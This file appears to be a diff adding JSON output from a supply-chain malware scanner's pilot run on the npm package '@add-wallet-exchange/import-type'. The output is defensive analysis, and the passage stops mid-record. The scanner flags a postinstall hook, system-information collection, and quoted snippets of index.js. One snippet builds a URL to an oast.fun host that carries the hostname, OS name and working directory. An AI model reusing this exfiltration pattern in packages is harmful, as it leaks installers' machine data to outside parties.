+                "mitre_tactics": [
+                  "collection"
+                ],
+                "threat_identifies": "threat.runtime.system.info",
+                "threat_rule": "threat-runtime-system-info",
+                "threat_description": "Detects active collection of system information (hostname, platform, architecture, user)",
+                "threat_location": "index.js:6",
+                "threat_code": "const osname = os.type();\nconst release = os.release();\nconst hostname = os.hostname();",
+                "threat_match": "os.type()",
+                "capability_identifies": null,
+                "capability_rule": null,
+                "file_path": "index.js"
+              },
+              {
+                "name": "risk.network.outbound",
+                "category": "network",
+                "severity": "medium",
+                "mitre_tactics": [
+                  "command-and-control"
+                ],
+                "threat_identifies": "threat.network.outbound.shady_links",
+                "threat_rule": "threat-network-outbound-shady-links",
+                "threat_description": "Detects URLs to URL shorteners, file sharing, and suspicious services",
+                "threat_location": "index.js:15",
+                "threat_code": "function makeFirstRequest(status) {\n    const url1 = `https://fycgdvjhjghrglljahci6bvckhfffk19x.oast.fun/?1=${encodeURIComponent(osname_str)}&2=${encodeURIComponent(cwd)}&3=${encodeURIComponent(hostname)}...",
+                "threat_match": "oast.fun",
+                "capability_identifies": null,
+                "capability_rule": null,
+                "file_path": "index.js"
+              },
+              {
+                "name": "risk.network.outbound",
+                "category": "network",
+                "severity": "medium",
+                "mitre_tactics": [
+                  "command-and-control"
+                ],
+                "threat_identifies": "threat.network.outbound.shady_links",
+                "threat_rule": "threat-network-outbound-shady-links",
+                "threat_description": "Detects URLs to URL shorteners, file sharing, and suspicious services",
+                "threat_location": "index.js:15",
+                "threat_code": "function makeFirstRequest(status) {\n    const url1 = `https://fycgdvjhjghrglljahci6bvckhfffk19x.oast.fun/?1=${encodeURIComponent(osname_str)}&2=${encodeURIComponent(cwd)}&3=${encodeURIComponent(hostname)}`\n  ...",
+                "threat_match": "oast.fun",
+                "capability_identifies": null,
+                "capability_rule": null,
+                "file_path": "index.js"
+              },
+              {
+                "name": "risk.network.outbound",
+                "category": "network",
+                "severity": "medium",
+                "mitre_tactics": [
+                  "command-and-control"
+                ],
+                "threat_identifies": "threat.network.outbound.shady_links",
+                "threat_rule": "threat-network-outbound-shady-links",
+                "threat_description": "Detects URLs to URL shorteners, file sharing, and suspicious services",
+                "threat_location": "index.js:15",
+                "threat_code": "function makeFirstRequest(status) {\n    const url1 = `https://fycgdvjhjghrglljahci6bvckhfffk19x.oast.fun/?1=${encodeURIComponent(osname_str)}&2=${encodeURIComponent(cwd)}&3=${encodeURIComponent(hostname)}`\n                 +...",
+                "threat_match": "oast.fun",
+                "capability_identifies": null,
+                "capability_rule": null,
+                "file_path": "index.js"
+              },
+              {
+                "name": "risk.network.outbound",
+                "category": "network",
+                "severity": "medium",
+                "mitre_tactics": [
+                  "command-and-control"
+                ],
+                "threat_identifies": "threat.network.outbound.shady_links",
+                "threat_rule": "threat-network-outbound-shady-links",
+                "threat_description": "Detects URLs to URL shorteners, file sharing, and suspicious services",
+                "threat_location": "index.js:15",
+                "threat_code": "function makeFirstRequest(status) {\n    const url1 = `https://fycgdvjhjghrglljahci6bvckhfffk19x.oast.fun/?1=${encodeURIComponent(osname_str)}&2=${encodeURIComponent(cwd)}&3=${encodeURIComponent(hostname)}`\n                 + ...",
+                "threat_match": "oast.fun",
+                "capability_identifies": null,
+                "capability_rule": null,
+                "file_path": "index.js"
+              }
+            ],
+            "toolAssessment": {
+              "score": 7.4,
+              "label": "high_risk",
+              "findingsCount": 11,
+              "scoreBreakdown": {
+                "severity_component": 0.3,
+                "chain_component": 0.08,
+                "specificity_component": 0.3,
+                "sophistication_component": 0.06,
+                "num_stages": 1,
+                "has_source_code_risks": true,
+                "max_severity": 3,
+                "dominant_specificity": "high",
+                "dominant_sophistication": "low"
+              },
+              "raw": {
+                "score": 7.4,
+                "label": "high_risk",
+                "findings_count": 11,
+                "score_breakdown": {
+                  "severity_component": 0.3,
+                  "chain_component": 0.08,
+                  "specificity_component": 0.3,
+                  "sophistication_component": 0.06,
+                  "num_stages": 1,
+                  "has_source_code_risks": true,
+                  "max_severity": 3,
+                  "dominant_specificity": "high",
+                  "dominant_sophistication": "low"
+                }
+              }
+            }
+          }
+        }
+      ]
+    },
+    "tier2": {
+      "analyzer": {
+        "analyzer": "obfuscation",
+        "analyzerVersion": "0.2.0",
+        "status": "SUCCESS",
+        "findings": [],
+        "errors": [],
+        "execution": {
+          "startedAt": "2026-10-01T09:26:33.534Z",
+          "completedAt": "2026-10-01T09:26:33.537Z",
+          "durationMs": 3
+        }
+      },
+      "derivedAnalyzers": [],
+      "restore": {
+        "outputRoot": "/Users/chase/whitehat/project/WHSproject/apps/scanner/experiments/agent-planning-static-filter/2026-10-01-smoke-v2/work/DD-NPM-002/derived/obfuscation",
+        "restored": [],
+        "unresolved": [],
+        "durationMs": 0,
+        "budgetExceeded": false,
+        "capabilityPreservation": {
+          "status": "NOT_APPLICABLE",
+          "files": [],
+          "limitations": []
+        }
+      },
+      "selection": {
+        "scannedFiles": 1,
+        "selectedFiles": 0
+      }
+    },
+    "normalization": {
+      "atomicEvidences": [
+        {
+          "schemaVersion": "0.1",
+          "evidenceId": "DD-NPM-002-evidence-00001",
+          "kind": "ATOMIC",
+          "signal": {
+            "id": "capability.lifecycle.postinstall",
+            "type": "POSTINSTALL_SCRIPT",
+            "category": "METADATA"
+          },
+          "subject": {
+            "ecosystem": "npm",
+            "packageName": "@add-wallet-exchange/import-type",
+            "packageVersion": "1.0.0",
+            "artifactHash": "b6758431f8d26421749a45b59ae92cd5dee771dd520a547a192c26fbe6d98d65"
+          },
+          "assertion": {
+            "summary": "Lifecycle script \"postinstall\" is present in package.json",
+            "basis": "METADATA_VALUE"
+          },
+          "sources": [
+            {
+              "analyzer": "metadata",
+              "analyzerVersion": "0.1.0",
+              "ruleId": "metadata.lifecycle.postinstall",
+              "rawFindingId": "metadata:metadata.lifecycle.postinstall:0"
+            }
+          ],
+          "locations": [
+            {
+              "type": "METADATA",
+              "jsonPointer": "/scripts/postinstall"
+            }
+          ],
+          "provenance": {
+            "scanId": "pilot-DD-NPM-002",
+            "generatedBy": "EVIDENCE_NORMALIZER",
+            "observedAt": "2026-10-01T00:00:00.000Z"
+          },
+          "limitations": [
+            "Lifecycle script presence does not prove that the script was executed."
+          ]
+        },
+        {
+          "schemaVersion": "0.1",
+          "evidenceId": "DD-NPM-002-evidence-00002",
+          "kind": "ATOMIC",
+          "signal": {
+            "id": "capability.system.information-read",
+            "type": "SYSTEM_INFO",
+            "category": "SYSTEM"
+          },
+          "taxonomy": "DISCOVERY_AND_COLLECTION",
+          "action": "INFORMATION_COLLECTION",
+          "subject": {
+            "ecosystem": "npm",
+            "packageName": "@add-wallet-exchange/import-type",
+            "packageVersion": "1.0.0",
+            "artifactHash": "b6758431f8d26421749a45b59ae92cd5dee771dd520a547a192c26fbe6d98d65"
+          },
+          "assertion": {
+            "summary": "Collection source access observed.",
+            "basis": "PATTERN_MATCH"
+          },
+          "sources": [
+            {
+              "analyzer": "custom-rule",
+              "analyzerVersion": "0.2.0",
+              "ruleId": "custom.collection-source",
+              "rawFindingId": "custom-rule:custom.collection-source:0"
+            }
+          ],
+          "locations": [
+            {
+              "type": "SOURCE_FILE",
+              "path": "index.js",
+              "startLine": 10
+            }
+          ],
+          "provenance": {
+            "scanId": "pilot-DD-NPM-002",
+            "generatedBy": "EVIDENCE_NORMALIZER",
+            "observedAt": "2026-10-01T00:00:00.000Z"
+          },
+          "limitations": [
+            "Static collection source presence does not prove that collected data was used or transmitted."
+          ]
+        },
+        {
+          "schemaVersion": "0.1",
+          "evidenceId": "DD-NPM-002-evidence-00003",
+          "kind": "ATOMIC",
+          "signal": {
+            "id": "capability.system.information-read",
+            "type": "SYSTEM_INFO",
+            "category": "SYSTEM"
+          },
+          "taxonomy": "DISCOVERY_AND_COLLECTION",
+          "action": "INFORMATION_COLLECTION",
+          "subject": {
+            "ecosystem": "npm",
+            "packageName": "@add-wallet-exchange/import-type",
+            "packageVersion": "1.0.0",
+            "artifactHash": "b6758431f8d26421749a45b59ae92cd5dee771dd520a547a192c26fbe6d98d65"
+          },
+          "assertion": {
+            "summary": "Collection source access observed.",
+            "basis": "PATTERN_MATCH"
+          },
+          "sources": [
+            {
+              "analyzer": "custom-rule",
+              "analyzerVersion": "0.2.0",
+              "ruleId": "custom.collection-source",
+              "rawFindingId": "custom-rule:custom.collection-source:1"
+            }
+          ],
+          "locations": [
+            {
+              "type": "SOURCE_FILE",
+              "path": "index.js",
+              "startLine": 6
+            }
+          ],
+          "provenance": {
+            "scanId": "pilot-DD-NPM-002",
+            "generatedBy": "EVIDENCE_NORMALIZER",
+            "observedAt": "2026-10-01T00:00:00.000Z"
+          },
+          "limitations": [
+            "Static collection source presence does not prove that collected data was used or transmitted."
+          ]
+        },
+        {
+          "schemaVersion": "0.1",
+          "evidenceId": "DD-NPM-002-evidence-00004",
+          "kind": "ATOMIC",
+          "signal": {
+            "id": "capability.system.information-read",
+            "type": "SYSTEM_INFO",
+            "category": "SYSTEM"
+          },
+          "taxonomy": "DISCOVERY_AND_COLLECTION",
+          "action": "INFORMATION_COLLECTION",
+          "subject": {
+            "ecosystem": "npm",
+            "packageName": "@add-wallet-exchange/import-type",
+            "packageVersion": "1.0.0",
+            "artifactHash": "b6758431f8d26421749a45b59ae92cd5dee771dd520a547a192c26fbe6d98d65"
+          },
+          "assertion": {
+            "summary": "Collection source access observed.",
+            "basis": "PATTERN_MATCH"
+          },
+          "sources": [
+            {
+              "analyzer": "custom-rule",
+              "analyzerVersion": "0.2.0",
+              "ruleId": "custom.collection-source",
+              "rawFindingId": "custom-rule:custom.collection-source:2"
+            }
+          ],
+          "locations": [
+            {
+              "type": "SOURCE_FILE",
+              "path": "index.js",
+              "startLine": 7
+            }
+          ],
+          "provenance": {
+            "scanId": "pilot-DD-NPM-002",
+            "generatedBy": "EVIDENCE_NORMALIZER",
+            "observedAt": "2026-10-01T00:00:00.000Z"
+          },
+          "limitations": [
+            "Static collection source presence does not prove that collected data was used or transmitted."
+          ]
+        },
+        {
+          "schemaVersion": "0.1",
+          "evidenceId": "DD-NPM-002-evidence-00005",
+          "kind": "ATOMIC",
+          "signal": {
+            "id": "capability.system.information-read",
+            "type": "SYSTEM_INFO",
+            "category": "SYSTEM"
+          },
+          "taxonomy": "DISCOVERY_AND_COLLECTION",
+          "action": "INFORMATION_COLLECTION",
+          "subject": {
+            "ecosystem": "npm",
+            "packageName": "@add-wallet-exchange/import-type",
+            "packageVersion": "1.0.0",
+            "artifactHash": "b6758431f8d26421749a45b59ae92cd5dee771dd520a547a192c26fbe6d98d65"
+          },
+          "assertion": {
+            "summary": "Collection source access observed.",
+            "basis": "PATTERN_MATCH"
+          },
+          "sources": [
+            {
+              "analyzer": "custom-rule",
+              "analyzerVersion": "0.2.0",
+              "ruleId": "custom.collection-source",
+              "rawFindingId": "custom-rule:custom.collection-source:3"
+            }
+          ],
+          "locations": [
+            {
+              "type": "SOURCE_FILE",
+              "path": "index.js",
+              "startLine": 8
+            }
+          ],
+          "provenance": {
+            "scanId": "pilot-DD-NPM-002",
+            "generatedBy": "EVIDENCE_NORMALIZER",
+            "observedAt": "2026-10-01T00:00:00.000Z"
+          },
+          "limitations": [
+            "Static collection source presence does not prove that collected data was used or transmitted."
+          ]
+        },
+        {
+          "schemaVersion": "0.1",
+          "evidenceId": "DD-NPM-002-evidence-00006",
+          "kind": "ATOMIC",
+          "signal": {
+            "id": "capability.lifecycle.local-entry",
+            "type": "INSTALL_SCRIPT",
+            "category": "METADATA"
+          },
+          "taxonomy": "INSTALLATION_AND_EXECUTION",
+          "action": "LIFECYCLE_ENTRY",
+          "subject": {
+            "ecosystem": "npm",
+            "packageName": "@add-wallet-exchange/import-type",
+            "packageVersion": "1.0.0",
+            "artifactHash": "b6758431f8d26421749a45b59ae92cd5dee771dd520a547a192c26fbe6d98d65"
+          },
+          "assertion": {
+            "summary": "postinstall lifecycle script references a local source entry.",
+            "basis": "EXECUTION_LINK"
+          },
+          "sources": [
+            {
+              "analyzer": "custom-rule",
+              "analyzerVersion": "0.2.0",
+              "ruleId": "custom.lifecycle-entry",
+              "rawFindingId": "custom-rule:custom.lifecycle-entry:4"
+            }
+          ],
+          "locations": [
+            {
+              "type": "METADATA",
+              "jsonPointer": "/scripts/postinstall"
+            }
+          ],
+          "provenance": {
+            "scanId": "pilot-DD-NPM-002",
+            "generatedBy": "EVIDENCE_NORMALIZER",
+            "observedAt": "2026-10-01T00:00:00.000Z"
+          },
+          "limitations": [
+            "Lifecycle script presence does not prove that the script was executed."
+          ]
+        },
+        {
+          "schemaVersion": "0.1",
+          "evidenceId": "DD-NPM-002-evidence-00007",
+          "kind": "ATOMIC",
+          "signal": {
+            "id": "capability.network.outbound",
+            "type": "NETWORK_EGRESS",
+            "category": "NETWORK"
+          },
+          "taxonomy": "NETWORK_C2_AND_EXFILTRATION",
+          "action": "NETWORK_REQUEST",
+          "subject": {
+            "ecosystem": "npm",
+            "packageName": "@add-wallet-exchange/import-type",
+            "packageVersion": "1.0.0",
+            "artifactHash": "b6758431f8d26421749a45b59ae92cd5dee771dd520a547a192c26fbe6d98d65"
+          },
+          "assertion": {
+            "summary": "Network egress API observed.",
+            "basis": "PATTERN_MATCH"
+          },
+          "sources": [
+            {
+              "analyzer": "custom-rule",
+              "analyzerVersion": "0.2.0",
+              "ruleId": "custom.network-outbound",
+              "rawFindingId": "custom-rule:custom.network-outbound:5"
+            }
+          ],
+          "locations": [
+            {
+              "type": "SOURCE_FILE",
+              "path": "index.js",
+              "startLine": 18
+            }
+          ],
+          "provenance": {
+            "scanId": "pilot-DD-NPM-002",
+            "generatedBy": "EVIDENCE_NORMALIZER",
+            "observedAt": "2026-10-01T00:00:00.000Z"
+          },
+          "limitations": [
+            "Static network API presence does not prove successful external communication."
+          ]
+        },
+        {
+          "schemaVersion": "0.1",
+          "evidenceId": "DD-NPM-002-evidence-00008",
+          "kind": "ATOMIC",
+          "signal": {
+            "id": "capability.network.outbound",
+            "type": "NETWORK_EGRESS",
+            "category": "NETWORK"
+          },
+          "taxonomy": "NETWORK_C2_AND_EXFILTRATION",
+          "action": "NETWORK_REQUEST",
+          "subject": {
+            "ecosystem": "npm",
+            "packageName": "@add-wallet-exchange/import-type",
+            "packageVersion": "1.0.0",
+            "artifactHash": "b6758431f8d26421749a45b59ae92cd5dee771dd520a547a192c26fbe6d98d65"
+          },
+          "assertion": {
+            "summary": "Network egress API observed.",
+            "basis": "PATTERN_MATCH"
+          },
+          "sources": [
+            {
+              "analyzer": "custom-rule",
+              "analyzerVersion": "0.2.0",
+              "ruleId": "custom.network-outbound",
+              "rawFindingId": "custom-rule:custom.network-outbound:6"
+            }
+          ],
+          "locations": [
+            {
+              "type": "SOURCE_FILE",
+              "path": "index.js",
+              "startLine": 37
+            }
+          ],
+          "provenance": {
+            "scanId": "pilot-DD-NPM-002",
+            "generatedBy": "EVIDENCE_NORMALIZER",
+            "observedAt": "2026-10-01T00:00:00.000Z"
+          },
+          "limitations": [
+            "Static network API presence does not prove successful external communication."
+          ]
+        },
+        {
+          "schemaVersion": "0.1",
+          "evidenceId": "DD-NPM-002-evidence-00009",
+          "kind": "ATOMIC",
+          "signal": {
+            "id": "capability.network.download",
+            "type": "REMOTE_FETCH",
+            "category": "NETWORK"
+          },
+          "taxonomy": "PAYLOAD_AND_DYNAMIC_CODE",
+          "action": "REMOTE_PAYLOAD_DOWNLOAD",
+          "subject": {
+            "ecosystem": "npm",
+            "packageName": "@add-wallet-exchange/import-type",
+            "packageVersion": "1.0.0",
+            "artifactHash": "b6758431f8d26421749a45b59ae92cd5dee771dd520a547a192c26fbe6d98d65"
+          },
+          "assertion": {
+            "summary": "Remote response or download candidate observed.",
+            "basis": "PATTERN_MATCH"
+          },
+          "sources": [
+            {
+              "analyzer": "custom-rule",
+              "analyzerVersion": "0.2.0",
+              "ruleId": "custom.remote-download",
+              "rawFindingId": "custom-rule:custom.remote-download:7"
+            }
+          ],
+          "locations": [
+            {
+              "type": "SOURCE_FILE",
+              "path": "index.js",
+              "startLine": 18
+            }
+          ],
+          "provenance": {
+            "scanId": "pilot-DD-NPM-002",
+            "generatedBy": "EVIDENCE_NORMALIZER",
+            "observedAt": "2026-10-01T00:00:00.000Z"
+          },
+          "limitations": [
+            "Static response flow does not prove successful download or payload retrieval."
+          ]
+        },
+        {
+          "schemaVersion": "0.1",
+          "evidenceId": "DD-NPM-002-evidence-00010",
+          "kind": "ATOMIC",
+          "signal": {
+            "id": "capability.network.download",
+            "type": "REMOTE_FETCH",
+            "category": "NETWORK"
+          },
+          "taxonomy": "PAYLOAD_AND_DYNAMIC_CODE",
+          "action": "REMOTE_PAYLOAD_DOWNLOAD",
+          "subject": {
+            "ecosystem": "npm",
+            "packageName": "@add-wallet-exchange/import-type",
+            "packageVersion": "1.0.0",
+            "artifactHash": "b6758431f8d26421749a45b59ae92cd5dee771dd520a547a192c26fbe6d98d65"
+          },
+          "assertion": {
+            "summary": "Remote response or download candidate observed.",
+            "basis": "PATTERN_MATCH"
+          },
+          "sources": [
+            {
+              "analyzer": "custom-rule",
+              "analyzerVersion": "0.2.0",
+              "ruleId": "custom.remote-download",
+              "rawFindingId": "custom-rule:custom.remote-download:8"
+            }
+          ],
+          "locations": [
+            {
+              "type": "SOURCE_FILE",
+              "path": "index.js",
+              "startLine": 37
+            }
+          ],
+          "provenance": {
+            "scanId": "pilot-DD-NPM-002",
+            "generatedBy": "EVIDENCE_NORMALIZER",
+            "observedAt": "2026-10-01T00:00:00.000Z"
+          },
+          "limitations": [
+            "Static response flow does not prove successful download or payload retrieval."
+          ]
+        },
+        {
+          "schemaVersion": "0.1",
+          "evidenceId": "DD-NPM-002-evidence-00011",
+          "kind": "ATOMIC",
+          "signal": {
+            "id": "capability.network.download",
+            "type": "REMOTE_FETCH",
+            "category": "NETWORK"
+          },
+          "subject": {
+            "ecosystem": "npm",
+            "packageName": "@add-wallet-exchange/import-type",
+            "packageVersion": "1.0.0",
+            "artifactHash": "b6758431f8d26421749a45b59ae92cd5dee771dd520a547a192c26fbe6d98d65"
+          },
+          "assertion": {
+            "summary": "Detects downloading files from network",
+            "basis": "PATTERN_MATCH"
+          },
+          "sources": [
+            {
+              "analyzer": "guarddog",
+              "analyzerVersion": "0.1.0",
+              "ruleId": "capability-network-download",
+              "rawFindingId": "guarddog:capability-network-download:0"
+            }
+          ],
+          "locations": [
+            {
+              "type": "SOURCE_FILE",
+              "path": "index.js",
+              "startLine": 18
+            }
+          ],
+          "provenance": {
+            "scanId": "pilot-DD-NPM-002",
+            "generatedBy": "EVIDENCE_NORMALIZER",
+            "observedAt": "2026-10-01T00:00:00.000Z"
+          },
+          "limitations": [
+            "A GuardDog static finding indicates observable code capability or a threat pattern, not runtime execution."
+          ]
+        },
+        {
+          "schemaVersion": "0.1",
+          "evidenceId": "DD-NPM-002-evidence-00012",
+          "kind": "ATOMIC",
+          "signal": {
+            "id": "capability.network.outbound",
+            "type": "NETWORK_EGRESS",
+            "category": "NETWORK"
+          },
+          "subject": {
+            "ecosystem": "npm",
+            "packageName": "@add-wallet-exchange/import-type",
+            "packageVersion": "1.0.0",
+            "artifactHash": "b6758431f8d26421749a45b59ae92cd5dee771dd520a547a192c26fbe6d98d65"
+          },
+          "assertion": {
+            "summary": "Detects network request capabilities (HTTP, sockets, etc.)",
+            "basis": "PATTERN_MATCH"
+          },
+          "sources": [
+            {
+              "analyzer": "guarddog",
+              "analyzerVersion": "0.1.0",
+              "ruleId": "capability-network-outbound",
+              "rawFindingId": "guarddog:capability-network-outbound:0"
+            }
+          ],
+          "locations": [
+            {
+              "type": "SOURCE_FILE",
+              "path": "index.js",
+              "startLine": 3
+            }
+          ],
+          "provenance": {
+            "scanId": "pilot-DD-NPM-002",
+            "generatedBy": "EVIDENCE_NORMALIZER",
+            "observedAt": "2026-10-01T00:00:00.000Z"
+          },
+          "limitations": [
+            "A GuardDog static finding indicates observable code capability or a threat pattern, not runtime execution."
+          ]
+        },
+        {
+          "schemaVersion": "0.1",
+          "evidenceId": "DD-NPM-002-evidence-00013",
+          "kind": "ATOMIC",
+          "signal": {
+            "id": "threat.system.information-collection",
+            "type": "SYSTEM_INFO",
+            "category": "SYSTEM"
+          },
+          "taxonomy": "DISCOVERY_AND_COLLECTION",
+          "action": "SYSTEM_INFORMATION_COLLECTION",
+          "subject": {
+            "ecosystem": "npm",
+            "packageName": "@add-wallet-exchange/import-type",
+            "packageVersion": "1.0.0",
+            "artifactHash": "b6758431f8d26421749a45b59ae92cd5dee771dd520a547a192c26fbe6d98d65"
+          },
+          "assertion": {
+            "summary": "Detects system info collection combined with network exfiltration (hostname/user in HTTP requests)",
+            "basis": "CO_OCCURRENCE"
+          },
+          "sources": [
+            {
+              "analyzer": "guarddog",
+              "analyzerVersion": "0.1.0",
+              "ruleId": "threat-network-exfil-sysinfo",
+              "rawFindingId": "guarddog:threat-network-exfil-sysinfo:0"
+            }
+          ],
+          "locations": [
+            {
+              "type": "SOURCE_FILE",
+              "path": "index.js",
+              "startLine": 8
+            }
+          ],
+          "provenance": {
+            "scanId": "pilot-DD-NPM-002",
+            "generatedBy": "EVIDENCE_NORMALIZER",
+            "observedAt": "2026-10-01T00:00:00.000Z"
+          },
+          "limitations": [
+            "The GuardDog rule combines multiple static signals, but successful runtime data flow or execution is not independently verified."
+          ]
+        },
+        {
+          "schemaVersion": "0.1",
+          "evidenceId": "DD-NPM-002-evidence-00014",
+          "kind": "ATOMIC",
+          "signal": {
+            "id": "threat.network.system-info-egress",
+            "type": "NETWORK_EGRESS",
+            "category": "NETWORK"
+          },
+          "taxonomy": "NETWORK_C2_AND_EXFILTRATION",
+          "action": "SYSTEM_INFORMATION_EXFILTRATION_CANDIDATE",
+          "subject": {
+            "ecosystem": "npm",
+            "packageName": "@add-wallet-exchange/import-type",
+            "packageVersion": "1.0.0",
+            "artifactHash": "b6758431f8d26421749a45b59ae92cd5dee771dd520a547a192c26fbe6d98d65"
+          },
+          "assertion": {
+            "summary": "Detects system info collection combined with network exfiltration (hostname/user in HTTP requests)",
+            "basis": "CO_OCCURRENCE"
+          },
+          "sources": [
+            {
+              "analyzer": "guarddog",
+              "analyzerVersion": "0.1.0",
+              "ruleId": "threat-network-exfil-sysinfo",
+              "rawFindingId": "guarddog:threat-network-exfil-sysinfo:0"
+            }
+          ],
+          "locations": [
+            {
+              "type": "SOURCE_FILE",
+              "path": "index.js",
+              "startLine": 8
+            }
+          ],
+          "provenance": {
+            "scanId": "pilot-DD-NPM-002",
+            "generatedBy": "EVIDENCE_NORMALIZER",
+            "observedAt": "2026-10-01T00:00:00.000Z"
+          },
+          "limitations": [
+            "The GuardDog rule combines multiple static signals, but successful runtime data flow or execution is not independently verified."
+          ]
+        },
+        {
+          "schemaVersion": "0.1",
+          "evidenceId": "DD-NPM-002-evidence-00015",
+          "kind": "ATOMIC",
+          "signal": {
+            "id": "threat.system.information-collection",
+            "type": "SYSTEM_INFO",
+            "category": "SYSTEM"
+          },
+          "taxonomy": "DISCOVERY_AND_COLLECTION",
+          "action": "SYSTEM_INFORMATION_COLLECTION",
+          "subject": {
+            "ecosystem": "npm",
+            "packageName": "@add-wallet-exchange/import-type",
+            "packageVersion": "1.0.0",
+            "artifactHash": "b6758431f8d26421749a45b59ae92cd5dee771dd520a547a192c26fbe6d98d65"
+          },
+          "assertion": {
+            "summary": "Detects system info collection combined with network exfiltration (hostname/user in HTTP requests)",
+            "basis": "CO_OCCURRENCE"
+          },
+          "sources": [
+            {
+              "analyzer": "guarddog",
+              "analyzerVersion": "0.1.0",
+              "ruleId": "threat-network-exfil-sysinfo",
+              "rawFindingId": "guarddog:threat-network-exfil-sysinfo:1"
+            }
+          ],
+          "locations": [
+            {
+              "type": "SOURCE_FILE",
+              "path": "index.js",
+              "startLine": 18
+            }
+          ],
+          "provenance": {
+            "scanId": "pilot-DD-NPM-002",
+            "generatedBy": "EVIDENCE_NORMALIZER",
+            "observedAt": "2026-10-01T00:00:00.000Z"
+          },
+          "limitations": [
+            "The GuardDog rule combines multiple static signals, but successful runtime data flow or execution is not independently verified."
+          ]
+        },
+        {
+          "schemaVersion": "0.1",
+          "evidenceId": "DD-NPM-002-evidence-00016",
+          "kind": "ATOMIC",
+          "signal": {
+            "id": "threat.network.system-info-egress",
+            "type": "NETWORK_EGRESS",
+            "category": "NETWORK"
+          },
+          "taxonomy": "NETWORK_C2_AND_EXFILTRATION",
+          "action": "SYSTEM_INFORMATION_EXFILTRATION_CANDIDATE",
+          "subject": {
+            "ecosystem": "npm",
+            "packageName": "@add-wallet-exchange/import-type",
+            "packageVersion": "1.0.0",
+            "artifactHash": "b6758431f8d26421749a45b59ae92cd5dee771dd520a547a192c26fbe6d98d65"
+          },
+          "assertion": {
+            "summary": "Detects system info collection combined with network exfiltration (hostname/user in HTTP requests)",
+            "basis": "CO_OCCURRENCE"
+          },
+          "sources": [
+            {
+              "analyzer": "guarddog",
+              "analyzerVersion": "0.1.0",
+              "ruleId": "threat-network-exfil-sysinfo",
+              "rawFindingId": "guarddog:threat-network-exfil-sysinfo:1"
+            }
+          ],
+          "locations": [
+            {
+              "type": "SOURCE_FILE",
+              "path": "index.js",
+              "startLine": 18
+            }
+          ],
+          "provenance": {
+            "scanId": "pilot-DD-NPM-002",
+            "generatedBy": "EVIDENCE_NORMALIZER",
+            "observedAt": "2026-10-01T00:00:00.000Z"
+          },
+          "limitations": [
+            "The GuardDog rule combines multiple static signals, but successful runtime data flow or execution is not independently verified."
+          ]
+        },
+        {
+          "schemaVersion": "0.1",
+          "evidenceId": "DD-NPM-002-evidence-00017",
+          "kind": "ATOMIC",
+          "signal": {
+            "id": "threat.system.information-collection",
+            "type": "SYSTEM_INFO",
+            "category": "SYSTEM"
+          },
+          "taxonomy": "DISCOVERY_AND_COLLECTION",
+          "action": "SYSTEM_INFORMATION_COLLECTION",
+          "subject": {
+            "ecosystem": "npm",
+            "packageName": "@add-wallet-exchange/import-type",
+            "packageVersion": "1.0.0",
+            "artifactHash": "b6758431f8d26421749a45b59ae92cd5dee771dd520a547a192c26fbe6d98d65"
+          },
+          "assertion": {
+            "summary": "Detects system info collection combined with network exfiltration (hostname/user in HTTP requests)",
+            "basis": "CO_OCCURRENCE"
+          },
+          "sources": [
+            {
+              "analyzer": "guarddog",
+              "analyzerVersion": "0.1.0",
+              "ruleId": "threat-network-exfil-sysinfo",
+              "rawFindingId": "guarddog:threat-network-exfil-sysinfo:2"
+            }
+          ],
+          "locations": [
+            {
+              "type": "SOURCE_FILE",
+              "path": "index.js",
+              "startLine": 37
+            }
+          ],
+          "provenance": {
+            "scanId": "pilot-DD-NPM-002",
+            "generatedBy": "EVIDENCE_NORMALIZER",
+            "observedAt": "2026-10-01T00:00:00.000Z"
+          },
+          "limitations": [
+            "The GuardDog rule combines multiple static signals, but successful runtime data flow or execution is not independently verified."
+          ]
+        },
+        {
+          "schemaVersion": "0.1",
+          "evidenceId": "DD-NPM-002-evidence-00018",
+          "kind": "ATOMIC",
+          "signal": {
+            "id": "threat.network.system-info-egress",
+            "type": "NETWORK_EGRESS",
+            "category": "NETWORK"
+          },
+          "taxonomy": "NETWORK_C2_AND_EXFILTRATION",
+          "action": "SYSTEM_INFORMATION_EXFILTRATION_CANDIDATE",
+          "subject": {
+            "ecosystem": "npm",
+            "packageName": "@add-wallet-exchange/import-type",
+            "packageVersion": "1.0.0",
+            "artifactHash": "b6758431f8d26421749a45b59ae92cd5dee771dd520a547a192c26fbe6d98d65"
+          },
+          "assertion": {
+            "summary": "Detects system info collection combined with network exfiltration (hostname/user in HTTP requests)",
+            "basis": "CO_OCCURRENCE"
+          },
+          "sources": [
+            {
+              "analyzer": "guarddog",
+              "analyzerVersion": "0.1.0",
+              "ruleId": "threat-network-exfil-sysinfo",
+              "rawFindingId": "guarddog:threat-network-exfil-sysinfo:2"
+            }
+          ],
+          "locations": [
+            {
+              "type": "SOURCE_FILE",
+              "path": "index.js",
+              "startLine": 37
+            }
+          ],
+          "provenance": {
+            "scanId": "pilot-DD-NPM-002",
+            "generatedBy": "EVIDENCE_NORMALIZER",
+            "observedAt": "2026-10-01T00:00:00.000Z"
+          },
+          "limitations": [
+            "The GuardDog rule combines multiple static signals, but successful runtime data flow or execution is not independently verified."
+          ]
+        },
+        {
+          "schemaVersion": "0.1",
+          "evidenceId": "DD-NPM-002-evidence-00019",
+          "kind": "ATOMIC",
+          "signal": {
+            "id": "threat.network.shady-link",
+            "type": "NETWORK_EGRESS",
+            "category": "NETWORK"
+          },
+          "taxonomy": "NETWORK_C2_AND_EXFILTRATION",
+          "action": "SUSPICIOUS_NETWORK_ENDPOINT",
+          "subject": {
+            "ecosystem": "npm",
+            "packageName": "@add-wallet-exchange/import-type",
+            "packageVersion": "1.0.0",
+            "artifactHash": "b6758431f8d26421749a45b59ae92cd5dee771dd520a547a192c26fbe6d98d65"
+          },
+          "assertion": {
+            "summary": "Detects URLs to URL shorteners, file sharing, and suspicious services",
+            "basis": "PATTERN_MATCH"
+          },
+          "sources": [
+            {
+              "analyzer": "guarddog",
+              "analyzerVersion": "0.1.0",
+              "ruleId": "threat-network-outbound-shady-links",
+              "rawFindingId": "guarddog:threat-network-outbound-shady-links:0"
+            }
+          ],
+          "locations": [
+            {
+              "type": "SOURCE_FILE",
+              "path": "index.js",
+              "startLine": 15
+            }
+          ],
+          "provenance": {
+            "scanId": "pilot-DD-NPM-002",
+            "generatedBy": "EVIDENCE_NORMALIZER",
+            "observedAt": "2026-10-01T00:00:00.000Z"
+          },
+          "limitations": [
+            "A static endpoint indicator does not prove successful communication, exfiltration, or command-and-control activity."
+          ]
+        },
+        {
+          "schemaVersion": "0.1",
+          "evidenceId": "DD-NPM-002-evidence-00020",
